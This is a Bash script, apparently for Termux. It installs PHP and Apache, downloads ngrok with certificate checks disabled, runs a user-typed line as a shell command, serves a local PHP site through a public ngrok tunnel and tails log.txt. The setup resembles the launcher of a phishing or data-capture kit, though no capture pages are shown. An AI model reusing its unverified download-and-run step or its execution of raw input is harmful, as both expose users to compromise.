#!/bin/bash
echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! DUDE PLEASE ENTER NGROK !!! \e[0m'
sleep 3
clear
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
termux-setup-storage
sudo apt-get install apache2 -y
apt install 
apt install php -y
pkg install wget -y
apt install tail -y
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
unzip ngrok-stable-linux-arm.zip
clear
echo ""
echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
echo ""
read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
sleep2
clear
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
sleep 4
clear
echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 